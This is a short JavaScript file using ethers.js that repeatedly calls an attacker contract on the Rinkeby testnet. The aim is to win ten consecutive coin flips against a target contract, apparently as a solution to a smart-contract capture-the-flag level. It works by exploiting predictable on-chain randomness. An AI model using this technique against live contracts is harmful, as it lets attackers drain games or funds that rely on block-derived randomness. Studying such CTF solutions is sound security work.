const { ethers } = require('ethers')
require("dotenv").config()

const provider = new ethers.providers.InfuraProvider("rinkeby")
const Wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider)

/* 
    Deploting a contract that determines the right guess of flip function
    based on same parameters as the target contract. Reverts the tx is 
    error status is thrown
*/

// Deploy an instance of ../hacker_contracts/CoinFlipHacker.sol and use it's address
const HackerContractAddress = "0xff0153D8932aeF5873a7520EFf5441738007044F"
const ABI = ["function attempt() public returns(bool)"]
const HackerContract = new ethers.Contract(HackerContractAddress, ABI, Wallet)

const EthBlockTime = 23000; // in milliseconds

const startHack = async() => {
    let counter = 0;
    const delay = setInterval(async()=>{
        try{
            await HackerContract.attempt()
            counter++;
            console.log(`Win Count: ${counter}`)
            if(counter >= 10){
                clearInterval(delay)
            }
        }catch(e){}
    },EthBlockTime)
    const currentWins = await provider.getStorageAt(
        "0x669133bfFf69f6e18192fEd3a159bf229977E694", // Target Contract Address
        0    
    )
    console.log(`Consecutive Wins are: ${currentWins}`)
}

startHack()

